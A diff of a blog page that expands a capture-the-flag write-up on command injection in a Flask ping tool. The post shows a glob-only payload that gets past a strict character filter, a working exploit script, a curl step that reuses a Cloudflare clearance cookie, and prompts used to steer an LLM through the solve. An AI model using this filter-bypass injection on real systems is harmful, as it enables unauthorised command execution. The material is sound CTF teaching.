@@ -7,7 +7,7 @@
     <meta name="color-scheme" content="dark">
 
     <title>Duck Nettool Revenge — LazyBlog</title>
-    <meta name="description" content="A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py&apos;s source.">
+    <meta name="description" content="Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages.">
             <meta name="author" content="tungdlm99">
         <meta name="generator" content="LazyBlog 1.11.0">
     <meta name="robots" content="index, follow, max-image-preview:large">
@@ -16,7 +16,7 @@
 
     <!-- Open Graph -->
     <meta property="og:title" content="Duck Nettool Revenge">
-    <meta property="og:description" content="A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py&apos;s source.">
+    <meta property="og:description" content="Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages.">
     <meta property="og:url" content="https://doantung99.github.io/blog/posts/duck-nettool-revenge">
     <meta property="og:type" content="article">
     <meta property="og:site_name" content="LazyBlog">
@@ -31,7 +31,7 @@
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary">
     <meta name="twitter:title" content="Duck Nettool Revenge">
-    <meta name="twitter:description" content="A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py&apos;s source.">
+    <meta name="twitter:description" content="Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages.">
         
     <!-- Alternates: machine-readable / AI / RSS -->
             <link rel="alternate" type="text/markdown" href="https://doantung99.github.io/blog/posts/duck-nettool-revenge.md">
@@ -41,7 +41,7 @@
     <!-- Favicon -->
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%2032%2032%22%3E%3Crect%20width%3D%2232%22%20height%3D%2232%22%20fill%3D%22%230a0e0a%22%2F%3E%3Ctext%20x%3D%224%22%20y%3D%2224%22%20font-family%3D%22monospace%22%20font-size%3D%2222%22%20fill%3D%22%2339ff14%22%3E%26gt%3B_%3C%2Ftext%3E%3C%2Fsvg%3E">
 
-            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Duck Nettool Revenge","description":"A ping tool with command injection behind a brutal character-set filter — RCE using only ;, ?, /, i, digits, and space to glob /bin/sh and leak app.py\u0027s source.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/duck-nettool-revenge","mainEntityOfPage":"https://doantung99.github.io/blog/posts/duck-nettool-revenge","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
+            <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Duck Nettool Revenge","description":"Command injection through a brutally restrictive character-set filter, solved by globbing binaries with ? wildcards and tricking dash into leaking app.py through its own error messages.","datePublished":"2026-06-28","dateModified":"2026-06-28","url":"https://doantung99.github.io/blog/posts/duck-nettool-revenge","mainEntityOfPage":"https://doantung99.github.io/blog/posts/duck-nettool-revenge","inLanguage":"vi","keywords":"ctf, v1t-ctf-2026, web, ai-assisted","author":{"@type":"Person","name":"tungdlm99"},"publisher":{"@type":"Organization","name":"LazyBlog","url":"https://doantung99.github.io/blog/"}}</script>
     
     <script>
     // Theme bootstrap — server already rendered the configured default on
@@ -74,7 +74,7 @@
 </div>
 
 <header>
-            <div class="callsign">XV5HP // MAYLAB // HẢI PHÒNG</div>
+            <div class="callsign">NAB // Hà Nội</div>
                     <p class="site-brand"><a href="/blog/" class="brand-link">LazyBlog</a></p>
                 <div class="subtitle">// A personal blog transmitting thoughts over imperfect radio waves. Expect noise, fading, and low bandwidth—but always authentic signals.</div>
         <div class="header-actions">
@@ -112,36 +112,135 @@
     
             <nav class="toc toc-inline" aria-label="Table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#reading-the-target-before-reading-the-app">Reading the target before reading the app</a></li><li class="level-3"><a href="#the-vulnerable-sink-and-the-filter">The vulnerable sink and the filter</a></li><li class="level-3"><a href="#naming-binaries-with-globs">Naming binaries with ? globs</a></li><li class="level-3"><a href="#the-exfil-trick-dash-leaking-python-through-error-messages">The exfil trick: dash leaking Python through error messages</a></li><li class="level-3"><a href="#assembling-the-payload">Assembling the payload</a></li><li class="level-3"><a href="#end-to-end-script">End-to-end script</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     
     <div class="post-body">
         <h2 id="summary">Summary</h2>
-<p>A Flask &quot;NetTool&quot; runs <code>ping -c 1 &lt;target&gt;</code> with <code>shell=True</code>, so it's command injection — but a regex restricts <code>target</code> to <code>i</code>, digits, <code>.</code>, <code>;</code>, <code>?</code>, <code>/</code>, and space, and forbids <code>&quot; .&quot;</code>/<code>&quot;. &quot;</code>. The solve names binaries and files entirely with <code>?</code> globs and feeds the readable <code>app.py</code> to <code>/bin/sh</code>, whose &quot;command not found&quot; error prints the docstring containing the flag.</p>
+<p>Duck Nettool Revenge is a <code>ping</code> wrapper that concatenates user input straight into a <code>shell=True</code> command, but guards it with a regex that allows only <code>i</code>, digits, <code>.</code>, <code>;</code>, <code>?</code>, <code>/</code>, and space. The intended path is command injection where every binary and filename is spelled out with <code>?</code> glob wildcards instead of letters, and the flag is exfiltrated not by reading <code>flag.txt</code> (it is <code>chmod 0000</code>) but by handing the readable <code>app.py</code> to <code>dash</code>, whose &quot;command not found&quot; error dutifully prints the Python docstring containing the flag. I ran this one as a steering exercise: I recognized the challenge class and pointed an LLM at the filter and the Dockerfile, let it grind through the glob enumeration, and corrected it when it tried to read the wrong file.</p>
 <h2 id="solution">Solution</h2>
-<p>The moment I saw a ping form, I called it as command injection and told the model to confirm the shell path and then map the filter — I wanted the exact alphabet I had to work with before touching payloads. It came back with the key facts: <code>;</code>, <code>?</code> (single-char glob), <code>/</code>, <code>.</code>, digits, and <code>i</code> survive, but no letters besides <code>i</code>, so I couldn't type <code>cat</code>, <code>sh</code>, or <code>python</code> at all.</p>
-<p>I steered next on reachability rather than blind exec. I had the model read the <code>Dockerfile</code> and source together, and it caught what mattered: <code>flag.txt</code> is <code>chmod 0000</code> (unreadable by the <code>ctf</code> user), <code>flag.py</code> is a troll, and <code>app.py</code> is <code>ctf</code>-readable with <code>v1t{fake_flag}</code> sitting in its docstring — and the remote swaps that placeholder for the real flag. So the goal wasn't reading <code>flag.txt</code>; it was dumping <code>app.py</code>'s own source.</p>
-<p>The model's first instinct was to source the file with <code>. app.py</code>, which I rejected because the filter blocks dot-space by design. I redirected it to spawn a fresh shell with <code>app.py</code> as an argument instead. It then did the grinding: globbing inside the container to find <code>/?i?/??</code> uniquely resolving to <code>/bin/sh</code> (the <code>i</code> is what separates <code>/bin</code> from <code>/lib</code>), and <code>???.??</code> matching <code>app.py</code> in the CWD. The clincher it surfaced — and I verified locally — is that <code>dash</code> chokes on the Python <code>&quot;&quot;&quot;docstring&quot;&quot;&quot;</code>, treating the whole block as one command name and echoing it verbatim in the &quot;not found&quot; error, flag and all.</p>
-<pre><code class="language-bash"># Local build + run (verify the leak), then the same payload goes to the remote.
+<h3 id="reading-the-target-before-reading-the-app">Reading the target before reading the app</h3>
+<p>The single most important judgment call here happened before any payload existed, and it is exactly the kind of thing I lean on an LLM to do exhaustively: read the <em>deployment</em>, not just <code>app.py</code>. The challenge ships a Flask app, a <code>Dockerfile</code>, a <code>docker-compose.yml</code>, a <code>flag.py</code>, a <code>flag.txt</code>, and a template. The naive instinct is &quot;RCE, then <code>cat flag.txt</code>.&quot; That instinct is wrong here, and the Dockerfile is what tells you so.</p>
+<p>Three facts from the build decide the entire approach:</p>
+<ul>
+<li><code>flag.txt</code> is <code>chmod 0000</code> and owned by <code>root</code>. The app runs as an unprivileged <code>ctf</code> user. There is no reading that file without privilege escalation, and there is no privesc in this challenge.</li>
+<li><code>flag.py</code> is just <code>print('FLAG')</code>. It is a decoy. Chasing it is a dead-end.</li>
+<li><code>app.py</code> is owned by <code>ctf</code>, so the app user <em>can</em> read it, and its module docstring literally contains the flag line: <em>&quot;The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable...&quot;</em></li>
+</ul>
+<p>The challenge infrastructure substitutes the real flag for <code>v1t{fake_flag}</code> on the remote. So the win condition is not &quot;read the protected file&quot;; it is &quot;make the process dump its own readable source.&quot; Once that reframing lands, the whole puzzle narrows to: get arbitrary command execution, then print <code>app.py</code>.</p>
+<h3 id="the-vulnerable-sink-and-the-filter">The vulnerable sink and the filter</h3>
+<p>The sink is unambiguous:</p>
+<pre><code class="language-python">ALLOWED_TARGET_RE = re.compile(r&quot;^(?!.* \.)(?!.*\. )[i0-9.;?/ ]+$&quot;)
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])
+def index():
+    target = request.form.get(&quot;target&quot;, &quot;&quot;)
+    if not ALLOWED_TARGET_RE.fullmatch(target):
+        return ... &quot;Only host-like characters are allowed&quot;
+    command = f&quot;ping -c 1 {target}&quot;
+    output = subprocess.check_output(command, shell=True, stderr=STDOUT,
+                                     timeout=5, text=True, env={&quot;PATH&quot;: &quot;/bin:/usr/bin&quot;})
+</code></pre>
+<p><code>shell=True</code> with our string interpolated directly into the command means classic shell injection. The only thing standing in the way is <code>ALLOWED_TARGET_RE</code>. Decompose it carefully, because every solvable thing in this challenge lives in the gaps:</p>
+<ul>
+<li><strong>Allowed character class:</strong> <code>[i0-9.;?/ ]</code> — the single letter <code>i</code>, all digits, dot, semicolon, question mark, slash, and space. Nothing else.</li>
+<li><strong>Two negative lookaheads:</strong> <code>(?!.* \.)</code> forbids the substring <code>&quot; .&quot;</code> (space then dot) anywhere, and <code>(?!.*\. )</code> forbids <code>&quot;. &quot;</code> (dot then space) anywhere.</li>
+</ul>
+<p>Take inventory of what survives. We have <code>;</code>, a command separator, so we can chain a second command after <code>ping</code>. We have <code>?</code>, which is a single-character glob wildcard in the shell. We have <code>/</code>, so we can build absolute paths. We have <code>.</code> and digits and <code>i</code>. We do <strong>not</strong> have: any letter except <code>i</code>, so no <code>cat</code>, <code>sh</code>, <code>python</code>, <code>bash</code>, <code>ls</code> typed literally; no <code>*</code> for multi-char globbing; no <code>`</code>, <code>$</code>, <code>(</code>, quotes for substitution; no <code>&lt;</code>, <code>&gt;</code>, <code>|</code>, <code>&amp;</code> for redirection or piping; no <code>-</code> for flags.</p>
+<p>That last one matters more than it looks. No <code>-</code> means no <code>cat -</code>, no <code>tail</code>, no command flags of any kind. No <code>&gt;</code> means no writing files. No <code>*</code> means every glob has to match an <em>exact length</em> with <code>?</code>. And no letters means we cannot name a single binary or file directly — we have to describe them by shape.</p>
+<p>The lookaheads are the subtle part. Why specifically forbid <code>&quot; .&quot;</code> and <code>&quot;. &quot;</code>? Because the author anticipated the cleanest exfil primitive: <code>. app.py</code>, the shell <code>source</code> builtin (dot-space-filename), and the relative path form <code>./something</code>. Forbidding dot-space kills <code>. app.py</code>; the design is deliberately aimed at the obvious shortcut. Recognizing <em>why</em> a filter forbids exactly those two digraphs is what tells you the intended solution routes around sourcing — and that is precisely the kind of &quot;read the adversary's intent&quot; reasoning I made sure the model did out loud rather than brute-forcing payloads.</p>
+<h3 id="naming-binaries-with-globs">Naming binaries with <code>?</code> globs</h3>
+<p>We need to execute something, but we cannot type its name. The shell's <code>?</code> glob matches exactly one character, and <code>/</code> lets us anchor into real directories. So we describe the <em>path shape</em> of the binary we want and let the shell expand it.</p>
+<p>The target is a shell. In this image, <code>/bin/sh</code> is <code>dash</code>. The enumeration that actually works (run inside the real container to confirm matches are unique):</p>
+<pre><code>/?i?/??   →  /bin/sh
+</code></pre>
+<p>Walk the pattern: <code>/</code> then three characters where the middle is literally <code>i</code> (<code>?i?</code> matches <code>bin</code> because of the <code>i</code> in the middle), then <code>/</code>, then exactly two characters (<code>??</code> matches <code>sh</code>). The <code>i</code> is doing real work: <code>/???/??</code> would <em>also</em> match other directories of the right shape (it can pick up things like <code>/dev/fd</code> or <code>/sys/fs</code>), so anchoring on the <code>i</code> in <code>bin</code> is what makes the expansion resolve uniquely to <code>/bin/sh</code>. This was the first place I had to correct the model — it initially proposed <code>/???/??</code>, which is ambiguous and can expand to multiple paths, breaking the command. Pinning on the <code>i</code> is the fix.</p>
+<p>For the file to read, the working directory is <code>/app</code> and <code>app.py</code> is the only file matching three-chars-dot-two-chars:</p>
+<pre><code>???.??    →  app.py
+</code></pre>
+<p><code>???</code> matches <code>app</code>, <code>.</code> is literal, <code>??</code> matches <code>py</code>. Clean and unique in <code>/app</code>.</p>
+<h3 id="the-exfil-trick-dash-leaking-python-through-error-messages">The exfil trick: dash leaking Python through error messages</h3>
+<p>Here is the genuinely clever part, and the reason <code>flag.txt</code> being unreadable does not matter. We hand <code>app.py</code> to <code>dash</code> as a script argument:</p>
+<pre><code>/bin/sh app.py
+</code></pre>
+<p><code>dash</code> tries to interpret <code>app.py</code> as a shell script. It is not one — it is Python. But it parses line by line, and crucially, <code>app.py</code> begins with a triple-quoted module docstring. To <code>dash</code>, <code>&quot;&quot;&quot;</code> is not special; the entire triple-quoted block becomes one enormous &quot;word.&quot; When <code>dash</code> tries to run the first line as a command, the whole docstring becomes a single command name, which does not exist, so it prints a &quot;not found&quot; error that <em>echoes the offending token back at you</em> — and that token is the docstring text, flag and all:</p>
+<pre><code>$ /bin/sh app.py
+app.py: 12:
+TODO / Deployment fixes
+...
+- The SHA-256 hash of v1t{fake_flag} is not realistically brute-forceable,   ← flag line
+...
+: not found
+app.py: 13: import: not found
+...
+</code></pre>
+<p>The error stream is captured because the app sets <code>stderr=STDOUT</code>, so the docstring comes right back in the HTTP response <code>&lt;pre&gt;</code>. This is the second place I had to steer: the model first reached for <code>cat app.py</code>-style reads (impossible — no letters) and then for sourcing with <code>.</code> (blocked by the dot-space lookahead). The insight that <em>the error message itself is the exfil channel</em> is what unlocks it. Running the file as a script argument, rather than sourcing it, also sidesteps the <code>&quot;. &quot;</code>/<code>&quot; .&quot;</code> lookaheads entirely, because there is never a dot adjacent to a space in the payload.</p>
+<h3 id="assembling-the-payload">Assembling the payload</h3>
+<p>Chain it after <code>ping</code> with <code>;</code>:</p>
+<pre><code>;/?i?/?? ???.??
+</code></pre>
+<p>The server builds and runs:</p>
+<pre><code>ping -c 1 ; /bin/sh app.py
+</code></pre>
+<p>Check it against the filter one more time, because a single illegal character rejects the whole request. Characters used: <code>;</code>, <code>/</code>, <code>?</code>, <code>i</code>, space, <code>.</code>. All in the allowed class. Adjacent pairs: <code>;/</code>, <code>/?</code>, <code>?i</code>, <code>i?</code>, <code>?/</code>, <code>?&lt;space&gt;</code>, <code>&lt;space&gt;?</code>, <code>?.</code>, <code>.?</code> — none of them is <code>&quot; .&quot;</code> or <code>&quot;. &quot;</code>. It passes.</p>
+<h3 id="end-to-end-script">End-to-end script</h3>
+<p>Stand up the challenge locally (the remote is behind a Cloudflare managed-challenge captcha; solve and validate locally, then submit the same payload through a real browser on the remote, where the flag substitution happens). This one script goes from raw challenge directory to printed flag:</p>
+<pre><code class="language-bash">#!/usr/bin/env bash
+set -euo pipefail
+
+# --- 1. Build and run the challenge exactly as deployed ---
 docker build -t duckrev .
-docker run -d --name t --read-only --tmpfs /tmp --tmpfs /run \
-  --cap-drop ALL --cap-add NET_RAW -p 5001:5000 duckrev
+docker rm -f duckrev_t 2&gt;/dev/null || true
+docker run -d --name duckrev_t \
+  --read-only --tmpfs /tmp --tmpfs /run \
+  --cap-drop ALL --cap-add NET_RAW \
+  -p 5001:5000 duckrev
 
-# Payload: ;/?i?/?? ???.??  -&gt;  ping -c 1 ; /bin/sh app.py
-# Only uses ; / ? i space . and contains no &quot; .&quot; or &quot;. &quot;
-curl -s -X POST --data-urlencode 'target=;/?i?/?? ???.??' http://127.0.0.1:5001/
+# give the Flask app a moment to bind
+until curl -s -o /dev/null http://127.0.0.1:5001/; do sleep 0.3; done
 
-# Remote is behind a Cloudflare captcha — submit in a browser, or reuse a
-# cf_clearance cookie + matching UA:
-curl -X POST 'https://api.v1t.site/' \
+# --- 2. Fire the injection payload ---
+# target = ;/?i?/?? ???.??  -&gt;  ping -c 1 ; /bin/sh app.py
+PAYLOAD=';/?i?/?? ???.??'
+RESP=&quot;$(curl -s -X POST --data-urlencode &quot;target=${PAYLOAD}&quot; http://127.0.0.1:5001/)&quot;
+
+# --- 3. Extract the flag line from dash's error output ---
+echo &quot;$RESP&quot; | grep -oE 'v1t\{[^}]*\}' | head -n1
+
+# Cleanup
+docker rm -f duckrev_t &gt;/dev/null
+</code></pre>
+<p>Locally this prints the placeholder <code>v1t{fake_flag}</code>, which confirms the technique end to end. On the remote, the identical payload in the target box returns the real flag on the &quot;SHA-256 hash of ...&quot; line, because the infrastructure swaps the placeholder for the real value.</p>
+<p>For the remote submission via CLI (only if you have harvested a <code>cf_clearance</code> cookie and matching User-Agent from a passed browser challenge):</p>
+<pre><code class="language-bash">curl -X POST 'https://api.v1t.site/' \
   -H 'Cookie: cf_clearance=&lt;TOKEN&gt;' -H 'User-Agent: &lt;UA&gt;' \
   --data-urlencode 'target=;/?i?/?? ???.??'
 # URL-encoded payload: %3B/%3Fi%3F/%3F%3F%20%3F%3F%3F.%3F%3F
 </code></pre>
-<p>The <code>&lt;pre&gt;</code> response includes the line <code>... The SHA-256 hash of v1t{...} is not realistically brute-forceable ...</code> — locally that's <code>v1t{fake_flag}</code>; on the remote it's the real flag.</p>
 <h2 id="flag">Flag</h2>
 <pre><code>v1t{br0_th15_15_duck}
 </code></pre>
+<p>(The local container only ever emits the placeholder <code>v1t{fake_flag}</code>; the value above is the real flag returned by the remote, where the substitution happens.)</p>
+<h2 id="lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</h2>
+<p>This challenge is a near-perfect candidate for human-AI division of labor, because the hard parts are (a) one reframing insight and (b) a lot of mechanical glob enumeration. I supplied the insight and the judgment; the model did the grinding. Here is what actually moved the solve.</p>
+<p><strong>Prompt 1 — force the reframe before any payload.</strong> My first instinct as a human was right, but I made the model commit to it explicitly so it would not waste cycles on <code>flag.txt</code>:</p>
+<blockquote>
+<p>&quot;Here is app.py, the Dockerfile, and docker-compose. Before proposing any exploit, tell me which file the flag is actually readable from, given the file permissions and which user runs the app. Rank flag.txt, flag.py, and app.py by readability for the app user, and justify each from the Dockerfile.&quot;</p>
+</blockquote>
+<p>This is the prompt that prevents the most expensive dead-end. The model, left to itself, defaults to &quot;RCE then cat flag.txt.&quot; Anchoring it on permissions first got it to conclude <code>flag.txt</code> (0000, root) is out and <code>app.py</code> (ctf-owned, contains the docstring) is the real target.</p>
+<p><strong>Prompt 2 — constrain the payload search to the surviving alphabet.</strong> I gave it the filter and forced it to reason in terms of what is <em>left</em>:</p>
+<blockquote>
+<p>&quot;The only allowed characters are i, 0-9, dot, semicolon, question-mark, slash, space — and the substrings ' .' and '. ' are both forbidden. Treat ? as a single-char glob and / as a path separator. Enumerate how to name /bin/sh and the file app.py using ONLY ? and / — no literal letters except i. The patterns must expand UNIQUELY inside the real container.&quot;</p>
+</blockquote>
+<p>The word &quot;uniquely&quot; is load-bearing. Without it the model happily proposed <code>/???/??</code>, which is ambiguous. With it, the model reasoned its way to anchoring on the <code>i</code> in <code>bin</code> (<code>/?i?/??</code>).</p>
+<p><strong>Prompt 3 — name the exfil channel.</strong> When the model kept trying to <em>read</em> the file (impossible — no letters, no redirection), I redirected it toward the error stream:</p>
+<blockquote>
+<p>&quot;You cannot type cat, cannot redirect, and '. ' (source) is filter-blocked. The app sets stderr=STDOUT. How can running app.py as an argument to /bin/sh leak its Python docstring through dash's own error output?&quot;</p>
+</blockquote>
+<p>Naming <code>stderr=STDOUT</code> and &quot;Python docstring through dash error output&quot; is what produced the <code>/bin/sh app.py</code> → &quot;command not found&quot; insight.</p>
+<p><strong>What to tell the model to focus on:</strong> the file-permission triage first; the surviving character set as a hard constraint; glob <em>uniqueness</em>; and the idea that error messages are an exfil channel when normal reads are blocked. <strong>Dead-ends to tell it to avoid explicitly:</strong> do not try to read <code>flag.txt</code> (0000/root), do not chase <code>flag.py</code> (decoy <code>print('FLAG')</code>), do not use <code>. app.py</code> (the dot-space lookahead exists precisely to block sourcing), and do not propose <code>*</code> or redirection (<code>&gt;</code>, <code>|</code>) — those characters are not in the class.</p>
+<p><strong>How I caught its mistakes:</strong> I verified every proposed glob by expanding it locally inside the actual container (<code>docker run ... /bin/sh -c 'echo /?i?/??'</code>) before trusting it, which is how I caught the ambiguous <code>/???/??</code> expansion. And I re-checked each candidate <code>target</code> string character-by-character against the regex (including both lookaheads) before sending it, because one stray character rejects the entire request and wastes a round-trip. The model is good at proposing; I owned the verification loop.</p>
+<p><strong>Fast-path prompt recipe for next time:</strong> &quot;Given this filter's surviving character set and the deployment's file permissions, tell me which file is readable, name every needed binary and file with unique <code>?</code> globs only, and find an error-message exfil channel — never assume cat or redirection is available.&quot;</p>
     </div>
 
     
@@ -163,7 +262,7 @@ curl -X POST 'https://api.v1t.site/' \
     <aside class="post-toc-wrap" aria-hidden="true">
         <nav class="toc" aria-label="Floating table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#reading-the-target-before-reading-the-app">Reading the target before reading the app</a></li><li class="level-3"><a href="#the-vulnerable-sink-and-the-filter">The vulnerable sink and the filter</a></li><li class="level-3"><a href="#naming-binaries-with-globs">Naming binaries with ? globs</a></li><li class="level-3"><a href="#the-exfil-trick-dash-leaking-python-through-error-messages">The exfil trick: dash leaking Python through error messages</a></li><li class="level-3"><a href="#assembling-the-payload">Assembling the payload</a></li><li class="level-3"><a href="#end-to-end-script">End-to-end script</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     </aside>
 </main>
